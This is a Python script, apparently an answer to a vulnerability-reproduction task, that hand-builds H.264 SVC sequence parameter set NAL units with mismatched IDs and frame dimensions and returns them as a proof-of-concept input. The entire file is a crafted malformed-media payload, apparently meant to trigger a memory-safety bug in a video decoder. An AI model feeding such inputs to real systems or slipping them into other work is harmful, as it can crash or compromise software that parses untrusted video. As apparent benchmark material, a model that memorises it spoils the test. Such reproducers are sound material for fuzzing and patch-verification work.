import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        
        class BitstreamWriter:
            def __init__(self):
                self.bits = ""

            def write(self, value: int, num_bits: int):
                if num_bits > 0:
                    self.bits += bin(value)[2:].zfill(num_bits)

            def write_ue(self, value: int):
                if value < 0:
                    raise ValueError("Negative value for unsigned Exp-Golomb")
                val = value + 1
                binary = bin(val)[2:]
                num_bits = len(binary)
                leading_zeros = num_bits - 1
                self.bits += '0' * leading_zeros + binary

            def get_rbsp_bytes(self) -> bytes:
                self.bits += '1'
                while len(self.bits) % 8 != 0:
                    self.bits += '0'

                b = bytearray()
                for i in range(0, len(self.bits), 8):
                    b.append(int(self.bits[i:i+8], 2))
                return bytes(b)

        def add_svc_extension(bs: BitstreamWriter):
            bs.write(1, 1)
            bs.write(0, 2)
            bs.write(0, 1)
            bs.write(0, 2)
            bs.write(0, 1)
            bs.write(1, 1)
            bs.write(0, 1)

        def create_svc_sps(sps_id: int, width_mbs: int, height_map_units: int) -> bytes:
            bs = BitstreamWriter()
            profile_idc = 83
            level_idc = 51

            bs.write(profile_idc, 8)
            bs.write(0b000000, 6)
            bs.write(0b00, 2)
            bs.write(level_idc, 8)
            bs.write_ue(sps_id)

            bs.write_ue(1)
            bs.write_ue(0)
            bs.write_ue(0)
            bs.write(0, 1)
            bs.write(0, 1)

            bs.write_ue(4)
            bs.write_ue(0)
            bs.write_ue(4)
            bs.write_ue(1)
            bs.write(0, 1)

            bs.write_ue(width_mbs - 1)
            bs.write_ue(height_map_units - 1)

            bs.write(1, 1)
            bs.write(1, 1)
            bs.write(0, 1)
            bs.write(0, 1)

            add_svc_extension(bs)

            return bs.get_rbsp_bytes()

        start_code = b'\x00\x00\x00\x01'

        sps_rbsp = create_svc_sps(sps_id=0, width_mbs=4, height_map_units=4)
        sps_nalu = start_code + b'\x67' + sps_rbsp

        subset_sps_rbsp = create_svc_sps(sps_id=1, width_mbs=8, height_map_units=8)
        subset_sps_nalu = start_code + b'\x74' + subset_sps_rbsp

        poc = sps_nalu + subset_sps_nalu
        return poc
